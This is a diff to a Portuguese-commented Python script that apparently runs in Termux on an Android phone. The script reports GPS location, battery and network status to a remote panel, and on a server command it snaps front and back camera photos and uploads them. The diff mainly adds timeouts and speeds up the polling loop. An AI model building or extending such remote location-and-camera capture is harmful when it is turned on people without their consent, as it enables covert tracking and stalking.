@@ -5,6 +5,7 @@ import requests
 import os
 import uuid
 import base64
+import threading
 from datetime import datetime
 
 URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
@@ -15,6 +16,14 @@ ARQUIVO_FOTO = os.path.expanduser("~/nexos_captura.jpg")
 def run_command(cmd):
     try: return subprocess.check_output(cmd, shell=True).decode().strip()
     except: return ""
+
+def run_command_timeout(cmd, timeout=5):
+    """Comando COM timeout - nao trava o loop"""
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+        return result.stdout.strip()
+    except:
+        return ""
 
 def obter_ou_criar_id_unico():
     if os.path.exists(ARQUIVO_ID):
@@ -46,11 +55,24 @@ def obter_status_rede():
         except: pass
     return "Dados Moveis"
 
+def obter_gps():
+    """GPS COM TIMEOUT de 5 segundos"""
+    out_loc = run_command_timeout("termux-location -p gps -r once", timeout=5)
+    if out_loc:
+        try:
+            loc_data = json.loads(out_loc)
+            lat = loc_data.get("latitude")
+            lon = loc_data.get("longitude")
+            if lat and lon and float(lat) != 0 and float(lon) != 0:
+                return float(lat), float(lon), True
+        except: pass
+    return ultima_lat_valida, ultima_lon_valida, False
+
 def capturar_e_enviar_foto(tipo, numero_camera):
     if os.path.exists(ARQUIVO_FOTO):
         os.remove(ARQUIVO_FOTO)
     
-    run_command(f"termux-camera-photo -c {numero_camera} {ARQUIVO_FOTO}")
+    run_command_timeout(f"termux-camera-photo -c {numero_camera} {ARQUIVO_FOTO}", timeout=5)
     time.sleep(2)
     
     if os.path.exists(ARQUIVO_FOTO) and os.path.getsize(ARQUIVO_FOTO) > 0:
@@ -59,19 +81,19 @@ def capturar_e_enviar_foto(tipo, numero_camera):
         
         payload = {"device_id": DEVICE_ID, "tipo": tipo, "photo": foto_b64}
         try:
-            response = requests.post(URL_UPLOAD_FOTO, data=json.dumps(payload), headers=headers_json, timeout=30)
+            response = requests.post(URL_UPLOAD_FOTO, data=json.dumps(payload), headers=headers_json, timeout=20)
             return response.status_code == 200
         except:
             pass
     return False
 
-print("🛰️  INICIANDO MONITORAMENTO...\n")
+print("🛰️  INICIANDO MONITORAMENTO (GPS com timeout 5s)...\n")
 
-# Loop principal
 while True:
+    ciclo_inicio = time.time()
     timestamp_atual = datetime.now()
     
-    # BATERIA - comando rápido
+    # BATERIA
     battery = "N/A"
     out_bat = run_command("termux-battery-status")
     if out_bat:
@@ -80,19 +102,9 @@ while True:
             battery = str(bat_data.get("percentage", "N/A"))
         except: pass
     
-    # GPS - SEM PKILL, SEM SLEEP
-    gps_ok = False
-    out_loc = run_command("termux-location -p gps -r once")
-    if out_loc:
-        try:
-            loc_data = json.loads(out_loc)
-            lat_novo = loc_data.get("latitude")
-            lon_novo = loc_data.get("longitude")
-            if lat_novo and lon_novo and float(lat_novo) != 0 and float(lon_novo) != 0:
-                ultima_lat_valida = float(lat_novo)
-                ultima_lon_valida = float(lon_novo)
-                gps_ok = True
-        except: pass
+    # GPS com timeout - NUNCA trava mais de 5 segundos
+    lat, lon, gps_ok = obter_gps()
+    ultima_lat_valida, ultima_lon_valida = lat, lon
     
     # UPTIME
     uptime = str(datetime.now() - inicio_operacao).split('.')[0]
@@ -117,24 +129,25 @@ while True:
             comando_cam = str(res_data.get("comando_cam", "wait")).lower()
             
             gps_icon = "📍" if gps_ok else "📡"
-            print(f"{gps_icon} [{timestamp_atual.strftime('%H:%M:%S')}] Bat:{battery}% {rede}")
+            ciclo_tempo = time.time() - ciclo_inicio
+            print(f"{gps_icon} [{timestamp_atual.strftime('%H:%M:%S')}] Bat:{battery}% {rede} ({ciclo_tempo:.1f}s)")
             
             if comando_cam == "take_dual":
                 print("📸 [DUAL] Capturando...")
                 ok1 = capturar_e_enviar_foto("back", 0)
-                time.sleep(0.5)
+                time.sleep(0.3)
                 ok2 = capturar_e_enviar_foto("front", 1)
                 
                 if ok1 and ok2:
                     print("   ✅ Fotos enviadas!")
                 elif ok1 or ok2:
-                    print("   ⚠️ Apenas uma foto enviada")
+                    print("   ⚠️ Apenas uma foto")
                 else:
-                    print("   ❌ Falha nas fotos")
+                    print("   ❌ Falha")
                 
                 if os.path.exists(ARQUIVO_FOTO):
                     os.remove(ARQUIVO_FOTO)
     except Exception as e:
-        print(f"⚠️ {str(e)[:50]}")
+        print(f"⚠️ {str(e)[:40]}")
     
-    time.sleep(3.0)
+    time.sleep(2.0)
